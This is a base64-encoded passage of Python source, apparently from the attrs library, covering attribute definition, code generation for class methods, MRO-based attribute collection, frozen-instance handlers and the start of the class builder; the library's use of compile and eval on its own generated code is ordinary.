IgTm9uZS4iXG4gICAgICAgIClcblxuICAgIGlmIGZhY3RvcnkgaXMgbm90IE5vbmU6XG4gICAgICAgIGlmIGRlZmF1bHQgaXMgbm90IE5PVEhJTkc6XG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxuICAgICAgICAgICAgICAgICJUaGUgYGRlZmF1bHRgIGFuZCBgZmFjdG9yeWAgYXJndW1lbnRzIGFyZSBtdXR1YWxseSAiXG4gICAgICAgICAgICAgICAgImV4Y2x1c2l2ZS4iXG4gICAgICAgICAgICApXG4gICAgICAgIGlmIG5vdCBjYWxsYWJsZShmYWN0b3J5KTpcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlRoZSBgZmFjdG9yeWAgYXJndW1lbnQgbXVzdCBiZSBhIGNhbGxhYmxlLiIpXG4gICAgICAgIGRlZmF1bHQgPSBGYWN0b3J5KGZhY3RvcnkpXG5cbiAgICBpZiBtZXRhZGF0YSBpcyBOb25lOlxuICAgICAgICBtZXRhZGF0YSA9IHt9XG5cbiAgICAjIEFwcGx5IHN5bnRhY3RpYyBzdWdhciBieSBhdXRvLXdyYXBwaW5nLlxuICAgIGlmIGlzaW5zdGFuY2Uob25fc2V0YXR0ciwgKGxpc3QsIHR1cGxlKSk6XG4gICAgICAgIG9uX3NldGF0dHIgPSBzZXR0ZXJzLnBpcGUoKm9uX3NldGF0dHIpXG5cbiAgICBpZiB2YWxpZGF0b3IgYW5kIGlzaW5zdGFuY2UodmFsaWRhdG9yLCAobGlzdCwgdHVwbGUpKTpcbiAgICAgICAgdmFsaWRhdG9yID0gYW5kXygqdmFsaWRhdG9yKVxuXG4gICAgaWYgY29udmVydGVyIGFuZCBpc2luc3RhbmNlKGNvbnZlcnRlciwgKGxpc3QsIHR1cGxlKSk6XG4gICAgICAgIGNvbnZlcnRlciA9IHBpcGUoKmNvbnZlcnRlcilcblxuICAgIHJldHVybiBfQ291bnRpbmdBdHRyKFxuICAgICAgICBkZWZhdWx0PWRlZmF1bHQsXG4gICAgICAgIHZhbGlkYXRvcj12YWxpZGF0b3IsXG4gICAgICAgIHJlcHI9cmVwcixcbiAgICAgICAgY21wPU5vbmUsXG4gICAgICAgIGhhc2g9aGFzaCxcbiAgICAgICAgaW5pdD1pbml0LFxuICAgICAgICBjb252ZXJ0ZXI9Y29udmVydGVyLFxuICAgICAgICBtZXRhZGF0YT1tZXRhZGF0YSxcbiAgICAgICAgdHlwZT10eXBlLFxuICAgICAgICBrd19vbmx5PWt3X29ubHksXG4gICAgICAgIGVxPWVxLFxuICAgICAgICBlcV9rZXk9ZXFfa2V5LFxuICAgICAgICBvcmRlcj1vcmRlcixcbiAgICAgICAgb3JkZXJfa2V5PW9yZGVyX2tleSxcbiAgICAgICAgb25fc2V0YXR0cj1vbl9zZXRhdHRyLFxuICAgIClcblxuXG5kZWYgX2NvbXBpbGVfYW5kX2V2YWwoc2NyaXB0LCBnbG9icywgbG9jcz1Ob25lLCBmaWxlbmFtZT0iIik6XG4gICAgIiIiXG4gICAgIkV4ZWMiIHRoZSBzY3JpcHQgd2l0aCB0aGUgZ2l2ZW4gZ2xvYmFsIChnbG9icykgYW5kIGxvY2FsIChsb2NzKSB2YXJpYWJsZXMuXG4gICAgIiIiXG4gICAgYnl0ZWNvZGUgPSBjb21waWxlKHNjcmlwdCwgZmlsZW5hbWUsICJleGVjIilcbiAgICBldmFsKGJ5dGVjb2RlLCBnbG9icywgbG9jcylcblxuXG5kZWYgX21ha2VfbWV0aG9kKG5hbWUsIHNjcmlwdCwgZmlsZW5hbWUsIGdsb2JzPU5vbmUpOlxuICAgICIiIlxuICAgIENyZWF0ZSB0aGUgbWV0aG9kIHdpdGggdGhlIHNjcmlwdCBnaXZlbiBhbmQgcmV0dXJuIHRoZSBtZXRob2Qgb2JqZWN0LlxuICAgICIiIlxuICAgIGxvY3MgPSB7fVxuICAgIGlmIGdsb2JzIGlzIE5vbmU6XG4gICAgICAgIGdsb2JzID0ge31cblxuICAgICMgSW4gb3JkZXIgb2YgZGVidWdnZXJzIGxpa2UgUERCIGJlaW5nIGFibGUgdG8gc3RlcCB0aHJvdWdoIHRoZSBjb2RlLFxuICAgICMgd2UgYWRkIGEgZmFrZSBsaW5lY2FjaGUgZW50cnkuXG4gICAgY291bnQgPSAxXG4gICAgYmFzZV9maWxlbmFtZSA9IGZpbGVuYW1lXG4gICAgd2hpbGUgVHJ1ZTpcbiAgICAgICAgbGluZWNhY2hlX3R1cGxlID0gKFxuICAgICAgICAgICAgbGVuKHNjcmlwdCksXG4gICAgICAgICAgICBOb25lLFxuICAgICAgICAgICAgc2NyaXB0LnNwbGl0bGluZXMoVHJ1ZSksXG4gICAgICAgICAgICBmaWxlbmFtZSxcbiAgICAgICAgKVxuICAgICAgICBvbGRfdmFsID0gbGluZWNhY2hlLmNhY2hlLnNldGRlZmF1bHQoZmlsZW5hbWUsIGxpbmVjYWNoZV90dXBsZSlcbiAgICAgICAgaWYgb2xkX3ZhbCA9PSBsaW5lY2FjaGVfdHVwbGU6XG4gICAgICAgICAgICBicmVha1xuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgZmlsZW5hbWUgPSAie30te30+Ii5mb3JtYXQoYmFzZV9maWxlbmFtZVs6LTFdLCBjb3VudClcbiAgICAgICAgICAgIGNvdW50ICs9IDFcblxuICAgIF9jb21waWxlX2FuZF9ldmFsKHNjcmlwdCwgZ2xvYnMsIGxvY3MsIGZpbGVuYW1lKVxuXG4gICAgcmV0dXJuIGxvY3NbbmFtZV1cblxuXG5kZWYgX21ha2VfYXR0cl90dXBsZV9jbGFzcyhjbHNfbmFtZSwgYXR0cl9uYW1lcyk6XG4gICAgIiIiXG4gICAgQ3JlYXRlIGEgdHVwbGUgc3ViY2xhc3MgdG8gaG9sZCBgQXR0cmlidXRlYHMgZm9yIGFuIGBhdHRyc2AgY2xhc3MuXG5cbiAgICBUaGUgc3ViY2xhc3MgaXMgYSBiYXJlIHR1cGxlIHdpdGggcHJvcGVydGllcyBmb3IgbmFtZXMuXG5cbiAgICBjbGFzcyBNeUNsYXNzQXR0cmlidXRlcyh0dXBsZSk6XG4gICAgICAgIF9fc2xvdHNfXyA9ICgpXG4gICAgICAgIHggPSBwcm9wZXJ0eShpdGVtZ2V0dGVyKDApKVxuICAgICIiIlxuICAgIGF0dHJfY2xhc3NfbmFtZSA9ICJ7fUF0dHJpYnV0ZXMiLmZvcm1hdChjbHNfbmFtZSlcbiAgICBhdHRyX2NsYXNzX3RlbXBsYXRlID0gW1xuICAgICAgICAiY2xhc3Mge30odHVwbGUpOiIuZm9ybWF0KGF0dHJfY2xhc3NfbmFtZSksXG4gICAgICAgICIgICAgX19zbG90c19fID0gKCkiLFxuICAgIF1cbiAgICBpZiBhdHRyX25hbWVzOlxuICAgICAgICBmb3IgaSwgYXR0cl9uYW1lIGluIGVudW1lcmF0ZShhdHRyX25hbWVzKTpcbiAgICAgICAgICAgIGF0dHJfY2xhc3NfdGVtcGxhdGUuYXBwZW5kKFxuICAgICAgICAgICAgICAgIF90dXBsZV9wcm9wZXJ0eV9wYXQuZm9ybWF0KGluZGV4PWksIGF0dHJfbmFtZT1hdHRyX25hbWUpXG4gICAgICAgICAgICApXG4gICAgZWxzZTpcbiAgICAgICAgYXR0cl9jbGFzc190ZW1wbGF0ZS5hcHBlbmQoIiAgICBwYXNzIilcbiAgICBnbG9icyA9IHsiX2F0dHJzX2l0ZW1nZXR0ZXIiOiBpdGVtZ2V0dGVyLCAiX2F0dHJzX3Byb3BlcnR5IjogcHJvcGVydHl9XG4gICAgX2NvbXBpbGVfYW5kX2V2YWwoIlxcbiIuam9pbihhdHRyX2NsYXNzX3RlbXBsYXRlKSwgZ2xvYnMpXG4gICAgcmV0dXJuIGdsb2JzW2F0dHJfY2xhc3NfbmFtZV1cblxuXG4jIFR1cGxlIGNsYXNzIGZvciBleHRyYWN0ZWQgYXR0cmlidXRlcyBmcm9tIGEgY2xhc3MgZGVmaW5pdGlvbi5cbiMgYGJhc2VfYXR0cnNgIGlzIGEgc3Vic2V0IG9mIGBhdHRyc2AuXG5fQXR0cmlidXRlcyA9IF9tYWtlX2F0dHJfdHVwbGVfY2xhc3MoXG4gICAgIl9BdHRyaWJ1dGVzIixcbiAgICBbXG4gICAgICAgICMgYWxsIGF0dHJpYnV0ZXMgdG8gYnVpbGQgZHVuZGVyIG1ldGhvZHMgZm9yXG4gICAgICAgICJhdHRycyIsXG4gICAgICAgICMgYXR0cmlidXRlcyB0aGF0IGhhdmUgYmVlbiBpbmhlcml0ZWRcbiAgICAgICAgImJhc2VfYXR0cnMiLFxuICAgICAgICAjIG1hcCBpbmhlcml0ZWQgYXR0cmlidXRlcyB0byB0aGVpciBvcmlnaW5hdGluZyBjbGFzc2VzXG4gICAgICAgICJiYXNlX2F0dHJzX21hcCIsXG4gICAgXSxcbilcblxuXG5kZWYgX2lzX2NsYXNzX3Zhcihhbm5vdCk6XG4gICAgIiIiXG4gICAgQ2hlY2sgd2hldGhlciAqYW5ub3QqIGlzIGEgdHlwaW5nLkNsYXNzVmFyLlxuXG4gICAgVGhlIHN0cmluZyBjb21wYXJpc29uIGhhY2sgaXMgdXNlZCB0byBhdm9pZCBldmFsdWF0aW5nIGFsbCBzdHJpbmdcbiAgICBhbm5vdGF0aW9ucyB3aGljaCB3b3VsZCBwdXQgYXR0cnMtYmFzZWQgY2xhc3NlcyBhdCBhIHBlcmZvcm1hbmNlXG4gICAgZGlzYWR2YW50YWdlIGNvbXBhcmVkIHRvIHBsYWluIG9sZCBjbGFzc2VzLlxuICAgICIiIlxuICAgIGFubm90ID0gc3RyKGFubm90KVxuXG4gICAgIyBBbm5vdGF0aW9uIGNhbiBiZSBxdW90ZWQuXG4gICAgaWYgYW5ub3Quc3RhcnRzd2l0aCgoIlwnIiwgXCciXCcpKSBhbmQgYW5ub3QuZW5kc3dpdGgoKCJcJyIsIFwnIlwnKSk6XG4gICAgICAgIGFubm90ID0gYW5ub3RbMTotMV1cblxuICAgIHJldHVybiBhbm5vdC5zdGFydHN3aXRoKF9jbGFzc3Zhcl9wcmVmaXhlcylcblxuXG5kZWYgX2hhc19vd25fYXR0cmlidXRlKGNscywgYXR0cmliX25hbWUpOlxuICAgICIiIlxuICAgIENoZWNrIHdoZXRoZXIgKmNscyogZGVmaW5lcyAqYXR0cmliX25hbWUqIChhbmQgZG9lc25cJ3QganVzdCBpbmhlcml0IGl0KS5cblxuICAgIFJlcXVpcmVzIFB5dGhvbiAzLlxuICAgICIiIlxuICAgIGF0dHIgPSBnZXRhdHRyKGNscywgYXR0cmliX25hbWUsIF9zZW50aW5lbClcbiAgICBpZiBhdHRyIGlzIF9zZW50aW5lbDpcbiAgICAgICAgcmV0dXJuIEZhbHNlXG5cbiAgICBmb3IgYmFzZV9jbHMgaW4gY2xzLl9fbXJvX19bMTpdOlxuICAgICAgICBhID0gZ2V0YXR0cihiYXNlX2NscywgYXR0cmliX25hbWUsIE5vbmUpXG4gICAgICAgIGlmIGF0dHIgaXMgYTpcbiAgICAgICAgICAgIHJldHVybiBGYWxzZVxuXG4gICAgcmV0dXJuIFRydWVcblxuXG5kZWYgX2dldF9hbm5vdGF0aW9ucyhjbHMpOlxuICAgICIiIlxuICAgIEdldCBhbm5vdGF0aW9ucyBmb3IgKmNscyouXG4gICAgIiIiXG4gICAgaWYgX2hhc19vd25fYXR0cmlidXRlKGNscywgIl9fYW5ub3RhdGlvbnNfXyIpOlxuICAgICAgICByZXR1cm4gY2xzLl9fYW5ub3RhdGlvbnNfX1xuXG4gICAgcmV0dXJuIHt9XG5cblxuZGVmIF9jb3VudGVyX2dldHRlcihlKTpcbiAgICAiIiJcbiAgICBLZXkgZnVuY3Rpb24gZm9yIHNvcnRpbmcgdG8gYXZvaWQgcmUtY3JlYXRpbmcgYSBsYW1iZGEgZm9yIGV2ZXJ5IGNsYXNzLlxuICAgICIiIlxuICAgIHJldHVybiBlWzFdLmNvdW50ZXJcblxuXG5kZWYgX2NvbGxlY3RfYmFzZV9hdHRycyhjbHMsIHRha2VuX2F0dHJfbmFtZXMpOlxuICAgICIiIlxuICAgIENvbGxlY3QgYXR0ci5pYnMgZnJvbSBiYXNlIGNsYXNzZXMgb2YgKmNscyosIGV4Y2VwdCAqdGFrZW5fYXR0cl9uYW1lcyouXG4gICAgIiIiXG4gICAgYmFzZV9hdHRycyA9IFtdXG4gICAgYmFzZV9hdHRyX21hcCA9IHt9ICAjIEEgZGljdGlvbmFyeSBvZiBiYXNlIGF0dHJzIHRvIHRoZWlyIGNsYXNzZXMuXG5cbiAgICAjIFRyYXZlcnNlIHRoZSBNUk8gYW5kIGNvbGxlY3QgYXR0cmlidXRlcy5cbiAgICBmb3IgYmFzZV9jbHMgaW4gcmV2ZXJzZWQoY2xzLl9fbXJvX19bMTotMV0pOlxuICAgICAgICBmb3IgYSBpbiBnZXRhdHRyKGJhc2VfY2xzLCAiX19hdHRyc19hdHRyc19fIiwgW10pOlxuICAgICAgICAgICAgaWYgYS5pbmhlcml0ZWQgb3IgYS5uYW1lIGluIHRha2VuX2F0dHJfbmFtZXM6XG4gICAgICAgICAgICAgICAgY29udGludWVcblxuICAgICAgICAgICAgYSA9IGEuZXZvbHZlKGluaGVyaXRlZD1UcnVlKVxuICAgICAgICAgICAgYmFzZV9hdHRycy5hcHBlbmQoYSlcbiAgICAgICAgICAgIGJhc2VfYXR0cl9tYXBbYS5uYW1lXSA9IGJhc2VfY2xzXG5cbiAgICAjIEZvciBlYWNoIG5hbWUsIG9ubHkga2VlcCB0aGUgZnJlc2hlc3QgZGVmaW5pdGlvbiBpLmUuIHRoZSBmdXJ0aGVzdCBhdCB0aGVcbiAgICAjIGJhY2suICBiYXNlX2F0dHJfbWFwIGlzIGZpbmUgYmVjYXVzZSBpdCBnZXRzIG92ZXJ3cml0dGVuIHdpdGggZXZlcnkgbmV3XG4gICAgIyBpbnN0YW5jZS5cbiAgICBmaWx0ZXJlZCA9IFtdXG4gICAgc2VlbiA9IHNldCgpXG4gICAgZm9yIGEgaW4gcmV2ZXJzZWQoYmFzZV9hdHRycyk6XG4gICAgICAgIGlmIGEubmFtZSBpbiBzZWVuOlxuICAgICAgICAgICAgY29udGludWVcbiAgICAgICAgZmlsdGVyZWQuaW5zZXJ0KDAsIGEpXG4gICAgICAgIHNlZW4uYWRkKGEubmFtZSlcblxuICAgIHJldHVybiBmaWx0ZXJlZCwgYmFzZV9hdHRyX21hcFxuXG5cbmRlZiBfY29sbGVjdF9iYXNlX2F0dHJzX2Jyb2tlbihjbHMsIHRha2VuX2F0dHJfbmFtZXMpOlxuICAgICIiIlxuICAgIENvbGxlY3QgYXR0ci5pYnMgZnJvbSBiYXNlIGNsYXNzZXMgb2YgKmNscyosIGV4Y2VwdCAqdGFrZW5fYXR0cl9uYW1lcyouXG5cbiAgICBOLkIuICp0YWtlbl9hdHRyX25hbWVzKiB3aWxsIGJlIG11dGF0ZWQuXG5cbiAgICBBZGhlcmUgdG8gdGhlIG9sZCBpbmNvcnJlY3QgYmVoYXZpb3IuXG5cbiAgICBOb3RhYmx5IGl0IGNvbGxlY3RzIGZyb20gdGhlIGZyb250IGFuZCBjb25zaWRlcnMgaW5oZXJpdGVkIGF0dHJpYnV0ZXMgd2hpY2hcbiAgICBsZWFkcyB0byB0aGUgYnVnZ3kgYmVoYXZpb3IgcmVwb3J0ZWQgaW4gIzQyOC5cbiAgICAiIiJcbiAgICBiYXNlX2F0dHJzID0gW11cbiAgICBiYXNlX2F0dHJfbWFwID0ge30gICMgQSBkaWN0aW9uYXJ5IG9mIGJhc2UgYXR0cnMgdG8gdGhlaXIgY2xhc3Nlcy5cblxuICAgICMgVHJhdmVyc2UgdGhlIE1STyBhbmQgY29sbGVjdCBhdHRyaWJ1dGVzLlxuICAgIGZvciBiYXNlX2NscyBpbiBjbHMuX19tcm9fX1sxOi0xXTpcbiAgICAgICAgZm9yIGEgaW4gZ2V0YXR0cihiYXNlX2NscywgIl9fYXR0cnNfYXR0cnNfXyIsIFtdKTpcbiAgICAgICAgICAgIGlmIGEubmFtZSBpbiB0YWtlbl9hdHRyX25hbWVzOlxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXG5cbiAgICAgICAgICAgIGEgPSBhLmV2b2x2ZShpbmhlcml0ZWQ9VHJ1ZSlcbiAgICAgICAgICAgIHRha2VuX2F0dHJfbmFtZXMuYWRkKGEubmFtZSlcbiAgICAgICAgICAgIGJhc2VfYXR0cnMuYXBwZW5kKGEpXG4gICAgICAgICAgICBiYXNlX2F0dHJfbWFwW2EubmFtZV0gPSBiYXNlX2Nsc1xuXG4gICAgcmV0dXJuIGJhc2VfYXR0cnMsIGJhc2VfYXR0cl9tYXBcblxuXG5kZWYgX3RyYW5zZm9ybV9hdHRycyhcbiAgICBjbHMsIHRoZXNlLCBhdXRvX2F0dHJpYnMsIGt3X29ubHksIGNvbGxlY3RfYnlfbXJvLCBmaWVsZF90cmFuc2Zvcm1lclxuKTpcbiAgICAiIiJcbiAgICBUcmFuc2Zvcm0gYWxsIGBfQ291bnRpbmdBdHRyYHMgb24gYSBjbGFzcyBpbnRvIGBBdHRyaWJ1dGVgcy5cblxuICAgIElmICp0aGVzZSogaXMgcGFzc2VkLCB1c2UgdGhhdCBhbmQgZG9uXCd0IGxvb2sgZm9yIHRoZW0gb24gdGhlIGNsYXNzLlxuXG4gICAgKmNvbGxlY3RfYnlfbXJvKiBpcyBUcnVlLCBjb2xsZWN0IHRoZW0gaW4gdGhlIGNvcnJlY3QgTVJPIG9yZGVyLCBvdGhlcndpc2VcbiAgICB1c2UgdGhlIG9sZCAtLSBpbmNvcnJlY3QgLS0gb3JkZXIuICBTZWUgIzQyOC5cblxuICAgIFJldHVybiBhbiBgX0F0dHJpYnV0ZXNgLlxuICAgICIiIlxuICAgIGNkID0gY2xzLl9fZGljdF9fXG4gICAgYW5ucyA9IF9nZXRfYW5ub3RhdGlvbnMoY2xzKVxuXG4gICAgaWYgdGhlc2UgaXMgbm90IE5vbmU6XG4gICAgICAgIGNhX2xpc3QgPSBbKG5hbWUsIGNhKSBmb3IgbmFtZSwgY2EgaW4gaXRlcml0ZW1zKHRoZXNlKV1cblxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZSh0aGVzZSwgb3JkZXJlZF9kaWN0KTpcbiAgICAgICAgICAgIGNhX2xpc3Quc29ydChrZXk9X2NvdW50ZXJfZ2V0dGVyKVxuICAgIGVsaWYgYXV0b19hdHRyaWJzIGlzIFRydWU6XG4gICAgICAgIGNhX25hbWVzID0ge1xuICAgICAgICAgICAgbmFtZVxuICAgICAgICAgICAgZm9yIG5hbWUsIGF0dHIgaW4gY2QuaXRlbXMoKVxuICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShhdHRyLCBfQ291bnRpbmdBdHRyKVxuICAgICAgICB9XG4gICAgICAgIGNhX2xpc3QgPSBbXVxuICAgICAgICBhbm5vdF9uYW1lcyA9IHNldCgpXG4gICAgICAgIGZvciBhdHRyX25hbWUsIHR5cGUgaW4gYW5ucy5pdGVtcygpOlxuICAgICAgICAgICAgaWYgX2lzX2NsYXNzX3Zhcih0eXBlKTpcbiAgICAgICAgICAgICAgICBjb250aW51ZVxuICAgICAgICAgICAgYW5ub3RfbmFtZXMuYWRkKGF0dHJfbmFtZSlcbiAgICAgICAgICAgIGEgPSBjZC5nZXQoYXR0cl9uYW1lLCBOT1RISU5HKVxuXG4gICAgICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShhLCBfQ291bnRpbmdBdHRyKTpcbiAgICAgICAgICAgICAgICBpZiBhIGlzIE5PVEhJTkc6XG4gICAgICAgICAgICAgICAgICAgIGEgPSBhdHRyaWIoKVxuICAgICAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgICAgIGEgPSBhdHRyaWIoZGVmYXVsdD1hKVxuICAgICAgICAgICAgY2FfbGlzdC5hcHBlbmQoKGF0dHJfbmFtZSwgYSkpXG5cbiAgICAgICAgdW5hbm5vdGF0ZWQgPSBjYV9uYW1lcyAtIGFubm90X25hbWVzXG4gICAgICAgIGlmIGxlbih1bmFubm90YXRlZCkgPiAwOlxuICAgICAgICAgICAgcmFpc2UgVW5hbm5vdGF0ZWRBdHRyaWJ1dGVFcnJvcihcbiAgICAgICAgICAgICAgICAiVGhlIGZvbGxvd2luZyBgYXR0ci5pYmBzIGxhY2sgYSB0eXBlIGFubm90YXRpb246ICJcbiAgICAgICAgICAgICAgICArICIsICIuam9pbihcbiAgICAgICAgICAgICAgICAgICAgc29ydGVkKHVuYW5ub3RhdGVkLCBrZXk9bGFtYmRhIG46IGNkLmdldChuKS5jb3VudGVyKVxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICArICIuIlxuICAgICAgICAgICAgKVxuICAgIGVsc2U6XG4gICAgICAgIGNhX2xpc3QgPSBzb3J0ZWQoXG4gICAgICAgICAgICAoXG4gICAgICAgICAgICAgICAgKG5hbWUsIGF0dHIpXG4gICAgICAgICAgICAgICAgZm9yIG5hbWUsIGF0dHIgaW4gY2QuaXRlbXMoKVxuICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UoYXR0ciwgX0NvdW50aW5nQXR0cilcbiAgICAgICAgICAgICksXG4gICAgICAgICAgICBrZXk9bGFtYmRhIGU6IGVbMV0uY291bnRlcixcbiAgICAgICAgKVxuXG4gICAgb3duX2F0dHJzID0gW1xuICAgICAgICBBdHRyaWJ1dGUuZnJvbV9jb3VudGluZ19hdHRyKFxuICAgICAgICAgICAgbmFtZT1hdHRyX25hbWUsIGNhPWNhLCB0eXBlPWFubnMuZ2V0KGF0dHJfbmFtZSlcbiAgICAgICAgKVxuICAgICAgICBmb3IgYXR0cl9uYW1lLCBjYSBpbiBjYV9saXN0XG4gICAgXVxuXG4gICAgaWYgY29sbGVjdF9ieV9tcm86XG4gICAgICAgIGJhc2VfYXR0cnMsIGJhc2VfYXR0cl9tYXAgPSBfY29sbGVjdF9iYXNlX2F0dHJzKFxuICAgICAgICAgICAgY2xzLCB7YS5uYW1lIGZvciBhIGluIG93bl9hdHRyc31cbiAgICAgICAgKVxuICAgIGVsc2U6XG4gICAgICAgIGJhc2VfYXR0cnMsIGJhc2VfYXR0cl9tYXAgPSBfY29sbGVjdF9iYXNlX2F0dHJzX2Jyb2tlbihcbiAgICAgICAgICAgIGNscywge2EubmFtZSBmb3IgYSBpbiBvd25fYXR0cnN9XG4gICAgICAgIClcblxuICAgIGlmIGt3X29ubHk6XG4gICAgICAgIG93bl9hdHRycyA9IFthLmV2b2x2ZShrd19vbmx5PVRydWUpIGZvciBhIGluIG93bl9hdHRyc11cbiAgICAgICAgYmFzZV9hdHRycyA9IFthLmV2b2x2ZShrd19vbmx5PVRydWUpIGZvciBhIGluIGJhc2VfYXR0cnNdXG5cbiAgICBhdHRycyA9IGJhc2VfYXR0cnMgKyBvd25fYXR0cnNcblxuICAgICMgTWFuZGF0b3J5IHZzIG5vbi1tYW5kYXRvcnkgYXR0ciBvcmRlciBvbmx5IG1hdHRlcnMgd2hlbiB0aGV5IGFyZSBwYXJ0IG9mXG4gICAgIyB0aGUgX19pbml0X18gc2lnbmF0dXJlIGFuZCB3aGVuIHRoZXkgYXJlblwndCBrd19vbmx5ICh3aGljaCBhcmUgbW92ZWQgdG9cbiAgICAjIHRoZSBlbmQgYW5kIGNhbiBiZSBtYW5kYXRvcnkgb3Igbm9uLW1hbmRhdG9yeSBpbiBhbnkgb3JkZXIsIGFzIHRoZXkgd2lsbFxuICAgICMgYmUgc3BlY2lmaWVkIGFzIGtleXdvcmQgYXJncyBhbnl3YXkpLiBDaGVjayB0aGUgb3JkZXIgb2YgdGhvc2UgYXR0cnM6XG4gICAgaGFkX2RlZmF1bHQgPSBGYWxzZVxuICAgIGZvciBhIGluIChhIGZvciBhIGluIGF0dHJzIGlmIGEuaW5pdCBpcyBub3QgRmFsc2UgYW5kIGEua3dfb25seSBpcyBGYWxzZSk6XG4gICAgICAgIGlmIGhhZF9kZWZhdWx0IGlzIFRydWUgYW5kIGEuZGVmYXVsdCBpcyBOT1RISU5HOlxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcbiAgICAgICAgICAgICAgICAiTm8gbWFuZGF0b3J5IGF0dHJpYnV0ZXMgYWxsb3dlZCBhZnRlciBhbiBhdHRyaWJ1dGUgd2l0aCBhICJcbiAgICAgICAgICAgICAgICAiZGVmYXVsdCB2YWx1ZSBvciBmYWN0b3J5LiAgQXR0cmlidXRlIGluIHF1ZXN0aW9uOiAlciIgJSAoYSwpXG4gICAgICAgICAgICApXG5cbiAgICAgICAgaWYgaGFkX2RlZmF1bHQgaXMgRmFsc2UgYW5kIGEuZGVmYXVsdCBpcyBub3QgTk9USElORzpcbiAgICAgICAgICAgIGhhZF9kZWZhdWx0ID0gVHJ1ZVxuXG4gICAgaWYgZmllbGRfdHJhbnNmb3JtZXIgaXMgbm90IE5vbmU6XG4gICAgICAgIGF0dHJzID0gZmllbGRfdHJhbnNmb3JtZXIoY2xzLCBhdHRycylcblxuICAgICMgQ3JlYXRlIEF0dHJzQ2xhc3MgKmFmdGVyKiBhcHBseWluZyB0aGUgZmllbGRfdHJhbnNmb3JtZXIgc2luY2UgaXQgbWF5XG4gICAgIyBhZGQgb3IgcmVtb3ZlIGF0dHJpYnV0ZXMhXG4gICAgYXR0cl9uYW1lcyA9IFthLm5hbWUgZm9yIGEgaW4gYXR0cnNdXG4gICAgQXR0cnNDbGFzcyA9IF9tYWtlX2F0dHJfdHVwbGVfY2xhc3MoY2xzLl9fbmFtZV9fLCBhdHRyX25hbWVzKVxuXG4gICAgcmV0dXJuIF9BdHRyaWJ1dGVzKChBdHRyc0NsYXNzKGF0dHJzKSwgYmFzZV9hdHRycywgYmFzZV9hdHRyX21hcCkpXG5cblxuaWYgUFlQWTpcblxuICAgIGRlZiBfZnJvemVuX3NldGF0dHJzKHNlbGYsIG5hbWUsIHZhbHVlKTpcbiAgICAgICAgIiIiXG4gICAgICAgIEF0dGFjaGVkIHRvIGZyb3plbiBjbGFzc2VzIGFzIF9fc2V0YXR0cl9fLlxuICAgICAgICAiIiJcbiAgICAgICAgaWYgaXNpbnN0YW5jZShzZWxmLCBCYXNlRXhjZXB0aW9uKSBhbmQgbmFtZSBpbiAoXG4gICAgICAgICAgICAiX19jYXVzZV9fIixcbiAgICAgICAgICAgICJfX2NvbnRleHRfXyIsXG4gICAgICAgICk6XG4gICAgICAgICAgICBCYXNlRXhjZXB0aW9uLl9fc2V0YXR0cl9fKHNlbGYsIG5hbWUsIHZhbHVlKVxuICAgICAgICAgICAgcmV0dXJuXG5cbiAgICAgICAgcmFpc2UgRnJvemVuSW5zdGFuY2VFcnJvcigpXG5cbmVsc2U6XG5cbiAgICBkZWYgX2Zyb3plbl9zZXRhdHRycyhzZWxmLCBuYW1lLCB2YWx1ZSk6XG4gICAgICAgICIiIlxuICAgICAgICBBdHRhY2hlZCB0byBmcm96ZW4gY2xhc3NlcyBhcyBfX3NldGF0dHJfXy5cbiAgICAgICAgIiIiXG4gICAgICAgIHJhaXNlIEZyb3plbkluc3RhbmNlRXJyb3IoKVxuXG5cbmRlZiBfZnJvemVuX2RlbGF0dHJzKHNlbGYsIG5hbWUpOlxuICAgICIiIlxuICAgIEF0dGFjaGVkIHRvIGZyb3plbiBjbGFzc2VzIGFzIF9fZGVsYXR0cl9fLlxuICAgICIiIlxuICAgIHJhaXNlIEZyb3plbkluc3RhbmNlRXJyb3IoKVxuXG5cbmNsYXNzIF9DbGFzc0J1aWxkZXIob2JqZWN0KTpcbiAgICAiIiJcbiAgICBJdGVyYXRpdmVseSBidWlsZCAqb25lKiBjbGFzcy5cbiAgICAiIiJcblxuICAgIF9fc2xvdHNfXyA9IChcbiAgICAgICAgIl9hdHRyX25hbWVzIixcbiAgICAgICAgIl9hdHRycyIsXG4gICAgICAgICJfYmFzZV9hdHRyX21hcCIsXG4gICAgICAgICJfYmFzZV9uYW1lcyIsXG4gICAgICAgICJfY2FjaGVfaGFzaCIsXG4gICAgICAgICJfY2xzIixcbiAgICAgICAgIl9jbHNfZGljdCIsXG4gICAgICAgICJfZGVsZXRlX2F0dHJpYnMiLFxuICAgICAgICAiX2Zyb3plbiIsXG4gICAgICAgICJfaGFzX3ByZV9pbml0IixcbiAgICAgICAgIl9oYXNfcG9zdF9pbml0IixcbiAgICAgICAgIl9pc19leGMiLFxuICAgICAgICAiX29uX3NldGF0dHIiLFxuICAgICAgICAiX3Nsb3RzIixcbiAgICAgICAgIl93ZWFrcmVmX3Nsb3QiLFxuICAgICAgICAiX3dyb3RlX293bl9zZXRhdHRyIixcbiAgICAgICAgIl9oYXNfY3VzdG9tX3NldGF0dHIiLFxuICAgIClcblxuICAgIGRlZiBfX2luaXRfXyhcbiAgICAgICAgc2VsZixcbiAgICAgICAgY2xzLFxuICAgICAgICB0aGVzZSxcbiAgICAgICAgc2xvdHMsXG4gICAgICAgIGZyb3plbixcbiAgICAgICAgd2Vha3JlZl9zbG90LFxuICAgICAgICBnZXRzdGF0ZV9zZXRzdGF0ZSxcbiAgICAgICAgYXV0b19hdHRyaWJzLFxuICAgICAgICBrd19vbmx5LFxuICAgICAgICBjYWNoZV9oYXNoLFxuICAgICAgICBpc19leGMsXG4gICAgICAgIGNvbGxlY3RfYnlfbXJvLFxuICAgICAgICBvbl9zZXRhdHRyLFxuICAgICAgICBoYXNfY3VzdG9tX3NldGF0dHIsXG4gICAgICAgIGZpZWxkX3RyYW5zZm9ybWVyLFxuICAgICk6XG4gICAgICAgIGF0dHJzLCBiYXNlX2F0dHJzLCBiYXNlX21h